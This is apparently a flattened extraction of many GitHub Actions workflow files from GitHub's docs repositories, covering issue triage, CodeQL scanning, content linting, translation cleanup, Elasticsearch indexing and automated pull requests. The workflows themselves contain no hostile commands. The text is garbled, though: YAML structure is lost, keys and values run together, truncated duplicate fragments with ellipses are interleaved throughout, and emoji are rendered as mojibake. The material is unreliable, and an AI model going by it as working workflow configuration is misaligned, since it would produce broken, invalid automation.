name: C ... nwanted- name: ... nwantedif: ${{ ... ync' }}close-i ... ync-pr:name: C ... ync PRs/home/huawei/github-actions-security/.github/workflows/github_docs__close-on-invalid-label.yamlClose issue/PR on adding invalid labelClose i ... d labelclose-on-adding-invalid-labelclose-o ... d-labelgithub.repository == 'github/docs' && github.event.label.name == 'invalid'github. ... nvalid'Close issue${{ github.event_name == 'issues' }}${{ git ... ues' }}gh issue close ${{ github.event.issue.html_url }}gh issu ... _url }}name: Close issue${{ github.event_name == 'pull_request_target' }}${{ git ... get' }}gh pr close ${{ github.event.pull_request.html_url }}gh pr c ... _url }}${{ failure() && github.event_name != 'pull_request_target' }}${{ fai ... get' }}- name: Close issueif: git ... nvalid'close-o ... -label:name: C ... d label/home/huawei/github-actions-security/.github/workflows/github_docs__codeql.yml**/*.js'**/*.js'**/*.ts'**/*.ts'**/*.jsx'**/*.jsx'**/*.tsx'**/*.tsx'.github/workflows/codeql.yml'.githu ... ql.yml'- '**/*.js'${{ github.workflow }} @ ${{ github.event.pull_request.head.label || github.head_ref || github.ref }}group:  ... ref }}'uses: a ...  v4.1.1github/codeql-action/init@eb055d739abdc2e8de2e5f4ba1a8b246daa779aagithub/ ... aa779aalanguag ... , ruby}uses: g ... v3.26.0github/codeql-action/analyze@eb055d739abdc2e8de2e5f4ba1a8b246daa779aa${{ failure() && github.event_name != 'pull_request' }}${{ fai ... est' }}- uses: ...  v4.1.1if: git ... b/docs'/home/huawei/github-actions-security/.github/workflows/github_docs__comment-release-note-info.ymlComment on release note changesComment ... changesdata/release-notes/enterprise-server/**data/re ... rver/**.github/workflows/comment-release-note-info.yml.github ... nfo.yml- data/ ... rver/**github.event.pull_request.user.login != 'release-controller[bot]' && github.repository == 'github/docs-internal'peter-evans/create-or-update-comment@71345be0265236311c031f5c7866368bd1eff043peter-e ... 1eff043issue-numberThank you for updating our GitHub Enterprise Server release notes. Please request a technical review for your changes. Once the technical review is complete, a member of the `docs-content-enterprise` team will review your changes.

- If the change is urgent, post in `#docs-content-enterprise` on Slack.
- Review the [style guide for release notes](https://docs.github.com/en/contributing/style-guide-and-content-model/style-guide#release-notes).
- If you're updating or adding a note, add a datestamp in the format `[Updated: YYYY-MM-DD]`.
- If you're removing a note, add an [Errata](https://docs.github.com/en/contributing/style-guide-and-content-model/style-guide#errata) section with details of the change.
issue-n ... mber }}uses: p ... 1eff043- uses: ... 1eff043comment:/home/huawei/github-actions-security/.github/workflows/github_docs__confirm-internal-staff-work-in-docs.ymlConfirm internal staff meant to post in publicConfirm ...  publiccheck-team-membershipcheck-t ... bershipgithub.repository == 'github/docs' && github.actor != 'docs-bot'github. ... cs-bot'membership_checkTEAM_CONTENT_REPO${{ secrets.TEAM_CONTENT_REPO }}${{ sec ... REPO }}TEAM_CO ... REPO }}// Only perform this action with GitHub employees
try {
  await github.rest.teams.getMembershipForUserInOrg({
    org: 'github',
    team_slug: 'employees',
    username: context.payload.sender.login,
  });
} catch(err) {
  // An error will be thrown if the user is not a GitHub employee
  // If a user is not a GitHub employee, we should stop here and
  // Not send a notification
  return
}

// Don't perform this action with Docs team members
try {
  await github.rest.teams.getMembershipForUserInOrg({
    org: 'github',
    team_slug: 'docs',
    username: context.payload.sender.login,
  });
  // If the user is a Docs team member, we should stop here and not send
  // a notification
  return
} catch(err) {
  // An error will be thrown if the user is not a Docs team member
  // If a user is not a Docs team member we should continue and send
  // the notification
}

const issueNo = context.number || context.issue.number

// Create an issue in our private repo
await github.rest.issues.create({
  owner: 'github',
  repo: process.env.TEAM_CONTENT_REPO,
  title: `@${context.payload.sender.login} confirm that \#${issueNo} should be in the public github/docs repo`,
  body: `@${context.payload.sender.login} opened https://github.com/github/docs/issues/${issueNo} publicly in the github/docs repo, instead of the private github/${process.env.TEAM_CONTENT_REPO} repo.\n\n@${context.payload.sender.login}, please confirm that this belongs in the public repo and that no sensitive information was disclosed by commenting below and closing the issue.\n\nIf this was not intentional and sensitive information was shared, please delete https://github.com/github/docs/issues/${issueNo} and notify us in the \#docs-open-source channel.\n\nThanks!`,
  labels: ['OS confirmation', 'skip FR board'],
});

core.setOutput('did_warn', 'true')
id: membership_checkSend Slack notification if a GitHub employee who isn't on the docs team opens an issue in publicSend Sl ...  public${{ steps.membership_check.outputs.did_warn && github.repository == 'github/docs' }}${{ ste ... ocs' }}someimportantcompany/github-actions-slack-message@a975b440de2bcef178d451cc70d4c1161b5a30cdsomeimp ... b5a30cdchannel${{ secrets.DOCS_OPEN_SOURCE_SLACK_CHANNEL_ID }}bot-tokentext<@${{github.actor}}> opened https://github.com/github/docs/issues/${{ github.event.number || github.event.issue.number }} publicly on the github/docs repo instead of a private repo. They have been notified via a new issue in the private repo to confirm this was intentional.<@${{gi ... tional.name: S ...  public- id: m ... p_checkcheck-t ... ership:name: C ...  public/home/huawei/github-actions-security/.github/workflows/github_docs__content-lint-markdown.ymlContent Lint Markdown'Conten ... rkdown'merge_groupbranchThe branch containing the changes we want to lint.The bra ... o lint.descrip ... o lint.branch:lint-contentSet up Node and dependenciesSet up  ... denciesname: S ... denciesGet changed content/data filesGet cha ... a files./.github/actions/get-changed-files./.gith ... d-filescontent/**
data/**
files: |name: G ... a filesPrint content linter annotations if changed content/data filesPrint c ... a filessteps.changed_files.outputs.filtered_changed_filessteps.c ... d_filesCHANGED_FILES${{ steps.changed_files.outputs.filtered_changed_files }}CHANGED_FILES: |-npm run lint-content -- --print-annotations --paths $CHANGED_FILESnpm run ... D_FILESname: P ... a filesRun content linter if changed content/data filesRun con ... a filesnpm run lint-content -- --errors-only --paths $CHANGED_FILESname: R ... a fileslint-content:name: ' ... rkdown'/home/huawei/github-actions-security/.github/workflows/github_docs__content-linter-rules-docs.ymlCheck content-linter rules docs'Check  ... s docs'src/content-linter/**'src/co ... ter/**'package-lock.jsondata/reusables/contributing/content-linter-rules.mddata/re ... ules.md.github/workflows/content-linter-rules-docs.yml- 'src/ ... ter/**'Check that content-linter-rules.md is up-to-datenpm run generate-content-linter-docsnpm run ... er-docsif [ -n "$(git status --porcelain)" ]; then
  git status
  git diff

  # Some whitespace for the sake of the message below
  echo ""
  echo ""

  echo "content-linter-rules.md is out of date."
  echo "Please run 'npm run generate-content-linter-docs' and commit the changes."
  exit 1;
fi
name: ' ... s docs'/home/huawei/github-actions-security/.github/workflows/github_docs__copy-api-issue-to-internal.ymlCopy to API/events issue to docs-contentCopy to ... content- labeledtransfer-issueTransfer issuegithub.event.label.name == 'fix-internally' && github.repository == 'github/docs'Check if this run was triggered by a member of the docs teamCheck i ... cs teamtriggered-by-member${{secrets.DOCS_BOT_PAT_BASE}}${{secr ... _BASE}}result-encodingconst triggerer_login = context.payload.sender.login
const teamMembers = await github.request(
  `/orgs/github/teams/docs/members?per_page=100`
)
const logins = teamMembers.data.map(member => member.login)
if (logins.includes(triggerer_login)) {
  console.log(`This workflow was triggered by ${triggerer_login} (on the docs team).`)
  return 'true'
}
console.log(`This workflow was triggered by ${triggerer_login} (not on the docs team), so no action will be taken.`)
return 'false'
github- ... _BASE}}name: C ... cs teamExit if not triggered by a docs team memberExit if ...  membersteps.triggered-by-member.outputs.result == 'false'steps.t ... 'false'echo Aborting. This workflow must be triggered by a member of the docs team.
exit 1
name: E ...  memberCreate an issue in the docs-content repoCreate  ... nt reponew_issue_url="$(gh issue create --title "$ISSUE_TITLE" --body "$ISSUE_BODY" --repo github/docs-content)"
echo 'NEW_ISSUE='$new_issue_url >> $GITHUB_ENV
ISSUE_TITLEGITHUB_ ... _BASE}}name: C ... nt repoComment on the old issueComment ... d issuegh issue comment $OLD_ISSUE --body "Thank you for opening this issue! Updates to this documentation must be made internally. I have copied your issue to an internal issue, so I will close this issue."gh issu ... issue."OLD_ISSUEname: C ... d issueClose the old issuegh issue close $OLD_ISSUEgh issu ... D_ISSUEComment on the new issueComment ... w issuegh issue comment $NEW_ISSUE --body "This issue was originally opened in the open source repo as $OLD_ISSUE"gh issu ... _ISSUE"NEW_ISSUE${{ env.NEW_ISSUE }}name: C ... w issue${{ failure() && github.event_name != 'workflow_dispatch' && github.repository == 'github/docs-internal' }}${{ fai ... nal' }}- name: ... cs teamname: Transfer issuetransfer-issue:name: C ... content/home/huawei/github-actions-security/.github/workflows/github_docs__count-translation-corruptions.ymlCount translation corruptionsCount t ... uptionssrc/languages/scripts/count-translation-corruptions.tssrc/lan ... ions.tssrc/languages/lib/correct-translation-content.jssrc/lan ... tent.js.github/workflows/count-translation-corruptions.yml.github ... ons.yml.github/actions/node-npm-setup/action.yml.github ... ion.yml.github/actions/clone-translations/action.ymlpackage**.json'package**.json'- src/l ... ions.tscount-translation-corruptionscount-t ... uptionsubuntu-20.04-xlCheckout English repoCheckou ... sh reponame: C ... sh repoClone all translationsClone a ... lations./.github/actions/clone-translations./.gith ... lationsname: C ... lationsRun countnpm run count-translation-corruptionsnpm run ... uptionsname: Run count- name: ... sh repocount-t ... ptions:name: C ... uptions/home/huawei/github-actions-security/.github/workflows/github_docs__delete-orphan-translation-files.ymlDelete orphan translation filesDelete  ... n filesdelete-orphan-translation-filesdelete- ... n-fileszhlanguage_dirtranslations/zh-cnlanguage_repogithub/docs-internal.zh-cngithub/ ... l.zh-cnlanguage: zhestranslations/es-esgithub/docs-internal.es-esgithub/ ... l.es-eslanguage: espttranslations/pt-brgithub/docs-internal.pt-brgithub/ ... l.pt-brlanguage: ptrutranslations/ru-rugithub/docs-internal.ru-rugithub/ ... l.ru-rulanguage: rujatranslations/ja-jpgithub/docs-internal.ja-jpgithub/ ... l.ja-jplanguage: jafrtranslations/fr-frgithub/docs-internal.fr-frgithub/ ... l.fr-frlanguage: frdetranslations/de-degithub/docs-internal.de-degithub/ ... l.de-delanguage: dekotranslations/ko-krgithub/docs-internal.ko-krgithub/ ... l.ko-krlanguage: ko- language: zhCheckout the language-specific repoCheckou ... ic repo${{ matrix.language_repo }}${{ mat ... repo }}${{ matrix.language_dir }}${{ mat ... _dir }}reposit ... repo }}name: C ... ic repoDelete orphan filesnpm run delete-orphan-translation-files -- ${{ matrix.language_dir }}
name: D ... n filesDebug deleted filesgit statusname: D ... d filesGit configgit config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"
name: Git configGit commit and push, create and merge PRGit com ... erge PRGH_TOKE ... BASE }}# If nothing to commit, exit now. It's fine. No orphans.
changes=$(git diff --name-only | wc -l)
untracked=$(git status --untracked-files --short | wc -l)
if [[ $changes -eq 0 ]] && [[ $untracked -eq 0 ]]; then
  echo "There are no changes to commit or untracked files. Exiting."
  exit 0
fi

# Create a general retry function that retries and sleeps
retry_command() {
  local max_attempts=3
  local attempt=1

  while [ $attempt -le $max_attempts ]; do
    echo "Attempt $attempt: $@"
    "$@" && return 0
    ((attempt++))
    sleep 3 # You can adjust the sleep duration as needed
  done

  echo "Max attempts reached. Command failed after $max_attempts attempts."
  return 1
}

git status
current_timestamp=$(date '+%Y-%m-%d-%H%M%S')
branch_name="delete-orphan-files-$current_timestamp"
git checkout -b "$branch_name"
current_daystamp=$(date '+%Y-%m-%d')
git commit -a -m "Delete orphan files ($current_daystamp)"
git push origin "$branch_name"

# Create PR
echo "Creating pull request..."
gh pr create \
  --title "Delete orphan files ($current_daystamp)" \
  --body 'ðŸ‘‹ humans. This PR was generated from docs-internal/.github/workflows/delete-orphan-translation-files.yml.
  ' \
  --repo "${{ matrix.language_repo }}" \
  --head=$branch_name
echo "Merge created PR..."
retry_command gh pr merge --merge --auto --delete-branch "$branch_name"
name: G ... erge PRdelete- ... -files:/home/huawei/github-actions-security/.github/workflows/github_docs__docs-review-collect.ymlAdd docs-reviewers request to the docs-content review boardAdd doc ... w board20 */6 * * *'20 */6 * * *'cron: ' ... s after- cron: ... s afteradd-requests-to-boardadd-req ... o-boardAdd requests to boardAdd req ... o board${{ github.repository == 'github/docs-internal' }}${{ git ... nal' }}Check out repo contentCheck o ... contentSetup Node.jsactions/setup-node@60edb5dd545a775178f52524783378180af0d1f8actions ... af0d1f8'package.json'node-ve ... e.json'name: Setup Node.jsnpm install @octokit/graphqlnpm ins ... graphqlRun script for audit-log-allowlistsRun scr ... owlistsnpm run fr-add-docs-reviewers-requests
TOKENPROJECT_NUMBER2936ORGANIZATION'github'REPOaudit-log-allowlists'audit- ... wlists'REVIEWERdocs-reviewers'docs-reviewers'FEATUREAudit log event descriptions'Audit  ... ptions'TOKEN:  ... BASE }}name: R ... owlists- name: ... contentname: A ... o boardadd-req ... -board:name: A ... w board/home/huawei/github-actions-security/.github/workflows/github_docs__dont-delete-assets.ymlDon't delete assetsassets/**'assets/**'.github/workflows/dont-delete-assets.yml'.githu ... ts.yml'- 'assets/**'dont-delete-assetsgithub.event.pull_request.user.login != 'docs-bot' && (github.repository == 'github/docs-internal' || github.repository == 'github/docs')github. ... /docs')Get comment markdownnpm run deleted-assets-pr-commentnpm run ... commentname: G ... arkdownFind possible previous commentFind po ... comment${{ steps.comment.outputs.markdown != '' }}${{ ste ... = '' }}peter-evans/find-comment@3eae4d37986fb5a8592848f6a574fdf654e61f9epeter-e ... 4e61f9efindCommentcomment-authorgithub-actions[bot]'github ... s[bot]'body-includes<!-- DELETED_ASSETS -->'<!-- D ... TS -->'name: F ... commentUpdate commentcomment-id${{ steps.findComment.outputs.comment-id }}${{ ste ... t-id }}${{ steps.comment.outputs.markdown }}${{ ste ... down }}edit-modereplacecomment ... t-id }}name: Update commentUltimately fail the workflow for attentionUltimat ... tentionecho "More than 1 asset image was deleted as part of this PR."
echo "See posted PR commented about how to get them back."
exit 1
name: U ... tentionif: git ... /docs')dont-delete-assets:name: D ...  assets/home/huawei/github-actions-security/.github/workflows/github_docs__dont-delete-features.ymlDon't delete featuresDon't d ... eaturesdata/features/**'data/features/**'.github/workflows/dont-delete-features.yml.github ... res.yml- 'data/features/**'dont-delete-featuresnpm run deleted-features-pr-comment<!-- DELETED_FEATURES -->'<!-- D ... ES -->'echo "More than 1 feature was deleted as part of this PR."
echo "See posted PR commented about how to get them back."
exit 1
dont-de ... atures:name: D ... eatures/home/huawei/github-actions-security/.github/workflows/github_docs__enterprise-dates.ymlEnterprise date updaterEnterpr ... updater20 16 * * 2'20 16 * * 2'open_enterprise_issueopen_en ... e_issueCheckout repository codeCheckou ... ry codename: C ... ry codeRun src/ghes-releases/scripts/update-enterprise-dates.jsRun src ... ates.jsnpm run update-enterprise-datesnpm run ... e-datesname: R ... ates.jsCreate pull requestcreate-pull-requestpeter-evans/create-pull-request@6cd32fd93684475c31847837f87bb135d40a2b79peter-e ... 40a2b79HUSKYHUSKY: '0'commit-messageðŸ¤– ran src/ghes-releases/scripts/update-enterprise-dates.js'\u1f916\udd16 ran ... tes.js'ðŸ¤– src/ghes-releases/lib/enterprise-dates.json update\u1f916\udd16 src/ ...  updateHello! The GitHub Enterprise Server release dates have changed.

 If CI passes, this PR will be auto-merged. :green_heart:

 If CI does not pass or other problems arise, contact #docs-engineering on slack.

This PR was ðŸ¤–-crafted by `.github/workflows/enterprise-dates.yml`. ðŸ§¶"Hello! ... ed.\n\nenterprise-server-dates-updateenterpr ... -updatedelete-branchEnable GitHub auto-mergeEnable  ... o-merge${{ steps.create-pull-request.outputs.pull-request-number }}AUTOMERGE_PR_NUMBERnpm run enable-automergenpm run ... tomergename: E ... o-mergeDelete remote branch (if previous steps failed)Delete  ... failed)git push origin --delete enterprise-server-dates-updategit pus ... -updateif: ${{ failure() }}Approvejuliangruber/approve-pull-request-action@dcc4effb325c0b503408619918d56e40653dcc91juliang ... 53dcc91numbergithub- ... OKEN }}if: ${{ ... mber }}- name: ... ry codename: E ... updateropen_en ... _issue:/home/huawei/github-actions-security/.github/workflows/github_docs__enterprise-release-issue.ymlOpen Enterprise release or deprecation issueOpen En ... n issue20 16 * * *'20 16 * * *'Open Enterprise issueOpen En ... e issueCreate an enterprise release issueCreate  ... e issuenpm run create-enterprise-issue -- releasenpm run ... releasename: C ... e issueCreate an enterprise deprecation issueCreate  ... n issuenpm run create-enterprise-issue -- deprecationnpm run ... ecationname: C ... n issuename: O ... e issuename: O ... n issue/home/huawei/github-actions-security/.github/workflows/github_docs__expertise-required-label-message.ymlExpertise Required label messageExperti ... messageComment on issue with expertise required messageComment ... messagegithub.event.label.name == 'contributor-expertise-required' && github.repository == 'github/docs'Comment on issue${{secrets.GITHUB_TOKEN}}${{secr ... TOKEN}}issueGITHUB_ ... TOKEN}}gh issue comment $issue --body 'Addressing this issue will require additional expertise from the contributor. Please make sure to review the issue carefully before opening a PR and ask any questions you might have in the issue.'
- name: ... n issuejob:name: E ... message/home/huawei/github-actions-security/.github/workflows/github_docs__first-responder-v2-prs-collect.ymlAdd docs-internal PRs to the docs-content FR project v2Add doc ... ject v2- reopenedfirst-responder-triage-prfirst-r ... iage-prAdd PR to FR project v2Add PR  ... ject v2github.repository == 'github/docs-internal' && github.event.pull_request.draft == false && github.actor != 'dependabot[bot]' && github.event.pull_request.head.ref != 'repo-sync' && !contains(github.event.pull_request.labels.*.name, 'skip FR board')github. ... board')Check if the event originated from a team memberCheck i ...  membercheck-membershipconst repoName = context.payload.repository.name
const ownerName = context.payload.repository.owner.login
const prAuthor = context.payload.pull_request.user.login
const teamMembers = await github.request(
  `/orgs/github/teams/docs/members?per_page=100`
)
const teamLogins = teamMembers.data.map(member => member.login)
if (teamLogins.some(login => login === prAuthor)) {
  console.log(`This pull request was authored by a member of the github/docs team.`)
  return 'true'
}
console.log(`This pull request was authored by an external contributor.`)
return 'false'
name: C ...  memberCheck if docs-bot is PR authorCheck i ...  authorPR_AUTHOR_ID${{ github.event.pull_request.user.id }}${{ git ... r.id }}PR_AUTH ... r.id }}if [ $PR_AUTHOR_ID == 77750099 ]; then
  echo "TYPE_FIELD_VALUE=3f142cf2" >> $GITHUB_ENV
else
  echo "TYPE_FIELD_VALUE=bbd0922a" >> $GITHUB_ENV
fi
name: C ...  authorAdd the docs-content-fr labelAdd the ... r label${{ steps.check-membership.outputs.result == 'false' }}${{ ste ... lse' }}gh pr edit $PR_URL --add-label docs-content-fr
name: A ... r labelTriage to docs-content FR projectTriage  ... projectsteps.check-membership.outputs.result == 'false'steps.c ... 'false'11672PROJECT_IDPVT_kwDNJr_OAGNkBgTYPE_FIELD_IDPVTSSF_lADNJr_OAGNkBs4D-NynPVTSSF_ ... s4D-NynDATE_FIELD_IDPVTF_lADNJr_OAGNkBs4D-N1hPVTF_lA ... s4D-N1hecho "Adding item to project..."

ITEM_ID=$(gh project item-add $PROJECT_NUMBER --owner github --url $PR_URL --format json | jq .id)

echo "Editing type..."

gh project item-edit --project-id $PROJECT_ID --id $ITEM_ID --field-id $TYPE_FIELD_ID --single-select-option-id ${{ env.TYPE_FIELD_VALUE }}

echo "Editing date..."

DATE=$(date '+%Y-%m-%d')

gh project item-edit --project-id $PROJECT_ID --id $ITEM_ID --field-id $DATE_FIELD_ID --date $DATE

echo "done editing"
name: T ... project- name: ...  membername: A ... ject v2first-r ... age-pr:/home/huawei/github-actions-security/.github/workflows/github_docs__generate-code-scanning-query-lists.ymlGenerate code scanning query listsGenerat ... y listsBranch to pull the source files from in the codeql repo (for example codeql-cli-2.x.x).'Branch ... .x.x).'descrip ... .x.x).'SOURCE_BRANCH:.github/workflows/generate-code-scanning-query-lists.yml.github ... sts.ymlsrc/code-scanning/scripts/generate-code-scanning-query-list.tssrc/cod ... list.ts.github/actions/install-cocofix/action.yml- .gith ... sts.ymlgenerate-query-listsCheckout codeql repogithub/codeqlcodeql${{ inputs.SOURCE_BRANCH || 'main' }}${{ inp ... ain' }}reposit ... /codeqlname: C ... ql repoGet the codeql SHA being syncedGet the ...  syncedcd codeql
OPENAPI_COMMIT_SHA=$(git rev-parse HEAD)
echo "OPENAPI_COMMIT_SHA=$OPENAPI_COMMIT_SHA" >> $GITHUB_OUTPUT
echo "Copied files from github/codeql repo. Commit SHA: $OPENAPI_COMMIT_SHA"
name: G ...  syncedDownload CodeQL CLI./codeql/.github/actions/fetch-codeql./codeq ... -codeqlname: D ... eQL CLITest CodeQL CLI DownloadTest Co ... ownloadcodeql --versionname: T ... ownloadStart CodeQL CLI server in the backgroundStart C ... kgroundcodeql execute cli-server &
sleep 3
codeql --version
./.github/actions/install-cocofix./.gith ... cocofixuses: . ... cocofixLint the code (eslint)Lint th ... eslint)${{ github.event_name == 'pull_request' }}${{ git ... est' }}PATH$PATH:${{ github.workspace }}/node_modules/.bin'$PATH: ... s/.bin'PATH: ' ... s/.bin'eslint --no-ignore src/code-scanning/scripts/generate-code-scanning-query-list.ts
name: L ... eslint)Lint the code (tsc)tsc --noEmit --project src/code-scanning/scripts/tsconfig.json
name: L ... e (tsc)Build code scanning query listBuild c ... ry listfor lang in "actions" "cpp" "csharp" "go" "java" "javascript" "python" "ruby" "swift"; do
  echo "Generating code scanning query list for $lang"
  npm run generate-code-scanning-query-list -- \
    --verbose \
    --codeql-path codeql \
    --codeql-dir codeql \
    -o data/reusables/code-scanning/codeql-query-tables/$lang.md \
    $lang
done
name: B ... ry listInsight into diffgit diff
name: I ... to diffDRY_RUN${{ github.event_name == 'pull_request'}}${{ git ... uest'}}
# When we started, we downloaded the CodeQL CLI here in this workflow.
# We have no intention of checking that in but we also don't want
# `git status ...` to show it as an untracked file.
rm -fr ./codeql

# If nothing to commit, exit now. It's fine. No orphans.
changes=$(git diff --name-only | wc -l)
untracked=$(git status --untracked-files --short | wc -l)
if [[ $changes -eq 0 ]] && [[ $untracked -eq 0 ]]; then
  echo "There are no changes to commit after running the generation and conversion scripts. Exiting..."
  exit 0
fi

git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

branchname=codeql-query-tables-${{ steps.codeql.outputs.OPENAPI_COMMIT_SHA }}

# Exit if the branch already exists. Since the actions/checkout fetch-depth is 1,
# it doesn't "know" about branches locally, so we need to manually list them.
branchExists=$(git ls-remote --heads origin refs/heads/$branchname | wc -l)

# When run on a pull_request, we're just testing the tooling.
# Exit before it actually pushes the possible changes.
if [ "$DRY_RUN" = "true" ]; then
  echo "Dry-run mode when run in a pull request"
  echo "See the 'Insight into diff' step for the changes it would create PR about."
  exit 0
fi

if [ $branchExists -ne 0 ]; then
  echo "Branch $branchname already exists in the remote repository."
  exit 0
else
  git checkout -b $branchname
fi

git add data/reusables/code-scanning/codeql-query-tables
git commit -m "Update CodeQL query tables"
git push -u origin $branchname

echo "Creating pull request..."
gh pr create \
  --title "Update CodeQL query tables" \
  --repo github/docs-internal \
 --label "codeql-query-tables,skip FR board,ready-for-doc-review" \
  --body 'ðŸ‘‹ humans. This PR updates the **CodeQL query table reusables** with the latest changes in preparation for the next **CodeQL CLI** release.

  No action is required from the first responder for the Docs content team. This PR will be reviewed and merged by the Code scanning and GHAS focus team as part of the next release of CodeQL CLI. (Synced from codeql@${{ steps.codeql.outputs.OPENAPI_COMMIT_SHA }})

  If CI does not pass or other problems arise, contact #docs-engineering on slack.'
generat ... -lists:name: G ... y lists/home/huawei/github-actions-security/.github/workflows/github_docs__headless-tests.ymlHeadless TestsELASTICSEARCH_URLhttp://localhost:9200/http:// ... t:9200/ELASTIC ... t:9200/playwright-testsplaywright-renderingplaywright-a11y- playw ... nderingnode:./.github/actions/setup-elasticsearch./.gith ... csearchuses: . ... csearch./.github/actions/cache-nextjs./.gith ... -nextjsuses: . ... -nextjsRun build scriptIndex fixtures into the local ElasticsearchIndex f ... csearchnpm run index-test-fixturesnpm run ... ixturesname: I ... csearchInstall headless browserInstall ... browsernpx playwright install --no-shellnpx pla ... o-shellname: I ... browserRun Playwright testsPLAYWRIGHT_WORKERS${{ fromJSON('[1, 4]')[github.repository == 'github/docs-internal'] }}PLAYWRI ... al'] }}npm run playwright-test -- ${{ matrix.node }} --reporter listnpm run ... er listplaywright-tests:name: Headless Tests/home/huawei/github-actions-security/.github/workflows/github_docs__hubber-contribution-help.ymlHubber contribution helpHubber  ... on help.github/workflows/hubber-contribution-help.yml.github ... elp.ymlcontent/**'content/**'data/**'data/**'- .gith ... elp.ymlgithub.repository == 'github/docs-internal' && github.actor != 'github-openapi-bot' && github.actor != 'docs-bot'try {
  await github.rest.teams.getMembershipForUserInOrg({
    org: 'github',
    team_slug: 'docs',
    username: context.payload.sender.login,
  });
  return true
} catch(err) {
  return false
}
Comment on the PRsteps.membership_check.outputs.result == 'false'steps.m ... 'false'gh pr comment $PR --body "### Next: add the review label

**ðŸ›Žï¸ Is this PR ready for review?** A PR is ready for a docs review _after_ the self-review checklist is complete.

 When this is ready for review, add the **\`ready-for-doc-review\`** label to this PR. The PR will then be automatically added to the [Docs Content review board](https://github.com/orgs/github/projects/2936). _Please allow at least 3 working days for a review, and longer if this is a substantial change._"
PRname: C ...  the PRif: git ... cs-bot'name: H ... on help/home/huawei/github-actions-security/.github/workflows/github_docs__index-autocomplete-search.ymlIndex autocomplete search in ElasticsearchIndex a ... csearch.github/workflows/index-autocomplete-search.yml.github ... rch.ymlsrc/search/scripts/index/**'src/se ... dex/**'- .gith ... rch.ymlindex-autocomplete-elasticsearchindex-a ... csearchgithub/docs-internal-datagithub/ ... al-datadocs-internal-dataCheck that Elasticsearch is accessibleCheck t ... essiblecurl --fail --retry-connrefused --retry 5 -I http://localhost:9200curl -- ... st:9200name: C ... essibleRun general auto-complete indexingRun gen ... ndexing${{ github.event_name == 'pull_request' && 'http://localhost:9200' || secrets.ELASTICSEARCH_URL }}${{ git ... _URL }}ELASTIC ... _URL }}npm run index-general-autocomplete -- docs-internal-datanpm run ... al-dataname: R ... ndexingRun AI search auto-complete indexingRun AI  ... ndexingnpm run index-ai-search-autocomplete -- docs-internal-data${{ failure() && github.event_name == 'schedule' }}${{ fai ... ule' }}if: ${{ ... nal' }}index-a ... search:/home/huawei/github-actions-security/.github/workflows/github_docs__index-general-search-pr.ymlIndex general search in Elasticsearch on PRIndex g ... h on PRsrc/search/**'src/search/**'.github/workflows/index-general-search-pr.yml.github ... -pr.yml.github/actions/setup-elasticsearch/action.yml- 'src/search/**'http://localhost:9200http:// ... st:9200HYDRO_ENDPOINTHYDRO_SECRETELASTIC ... st:9200dryRunElasticsearchIndexesdryRunE ... IndexesClone docs-internal-dataClone d ... al-datareposit ... al-dataname: C ... al-dataStart the server in the backgroundStart t ... kgroundENABLE_DEV_LOGGINGENABLE_ ... : falsenpm run general-search-scrape-server > /tmp/stdout.log 2> /tmp/stderr.log &

# first sleep to give it a chance to start
sleep 6
curl --retry-connrefused --retry 4 -I http://localhost:4002/
Debug server outputs on errorsDebug s ...  errorsecho "____STDOUT____"
cat /tmp/stdout.log
echo "____STDERR____"
cat /tmp/stderr.log
Scrape records into a temp directoryScrape  ... rectoryTHROW_ON_EMPTYDOCS_INTERNAL_DATATHROW_O ... : falsemkdir /tmp/records
npm run general-search-scrape -- /tmp/records \
  --language en \
  --version fpt

ls -lh /tmp/records
name: S ... rectorycurl --fail --retry-connrefused --retry 5 -I ${{ env.ELASTICSEARCH_URL }}
Index into ElasticsearchIndex i ... csearchnpm run index-general-search -- /tmp/records \
  --language en \
  --version fpt
Check created indexes and aliasesCheck c ... aliasescurl --fail --retry-connrefused --retry 5 ${{ env.ELASTICSEARCH_URL }}/_cat/indices?v
curl --fail --retry-connrefused --retry 5 ${{ env.ELASTICSEARCH_URL }}/_cat/indices?v
name: C ... aliasesruns-on ... 0.04-xldryRunE ... ndexes:name: I ... h on PR/home/huawei/github-actions-security/.github/workflows/github_docs__index-general-search.ymlIndex general search in ElasticsearchIndex g ... csearchVersion to exclusively generate the search index for. E.g. 'dotcom', 'ghes-3.12'"Versio ... -3.12'"descrip ... -3.12'"Comma separated languages. E.g. 'en,es,ja,pt,zh,ru,fr,ko,de' (defaults to all)"Comma  ... o all)"descrip ... o all)"cron: ' ... he hour- cron: ... he hourPurge Fastly'Purge Fastly'['Purge Fastly']- completedworkflo ... astly']${{ github.workflow }} @ ${{ github.head_ref }} ${{ github.event_name }}'${{ gi ... ame }}'group:  ... ame }}'${{ secrets.ELASTICSEARCH_URL }}figureOutMatrix// Edit this list for the definitive list of languages
// (other than English) we want to index in Elasticsearch.
const allNonEnglish = 'es,ja,pt,zh,ru,fr,ko,de'.split(',')
const allPossible = ["en", ...allNonEnglish]

if (context.eventName === "workflow_run") {
  if (context.payload.workflow_run.conclusion === "success") {
    return ["en"]
  }
  console.warn(`NOTE! It was a workflow_run but not success ('${context.payload.workflow_run.conclusion}')`)
  console.warn("This means we're not going to index anything in the next dependent step.")
  return []
}

if (context.eventName === "workflow_dispatch") {
  if (context.payload.inputs.languages) {
    const clean = context.payload.inputs.languages.split(',').map(x => x.trim()).filter(Boolean)
    const notRecognized = clean.find(x => !allPossible.includes(x))
    if (notRecognized) {
      throw new Error(`'${notRecognized}' is not a recognized language code`)
    }
    return clean
  }
  return allPossible
}

if (context.eventName === "schedule") {
  return allNonEnglish
}

console.log(context)
throw new Error(`Unable figure out what languages to run (${context.eventName})`)
uses: a ...  v7.0.0Debug outputecho "${{ steps.set-matrix.outputs.result }}"echo "$ ... ult }}"name: Debug output- uses: ...  v7.0.0updateElasticsearchIndexesupdateE ... IndexesUpdate indexes${{ github.repository == 'github/docs-internal' && needs.figureOutMatrix.outputs.matrix != '[]' }}${{ git ... '[]' }}${{ fromJSON(needs.figureOutMatrix.outputs.matrix) }}languag ... rix) }}${{ matrix.language != 'en' }}${{ mat ... 'en' }}Run build scriptsname: R ... scriptsmkdir /tmp/records
npm run general-search-scrape -- /tmp/records \
  --language ${{ matrix.language }}

ls -lh /tmp/records
npm run index-general-search -- /tmp/records \
  --language ${{ matrix.language }} \
  --stagger-seconds 5 \
  --retries 5
# Not using `--fail` here because I've observed that it can fail
# with a rather cryptic 404 error when it should, if anything, be
# a 200 OK with a list of no indices.
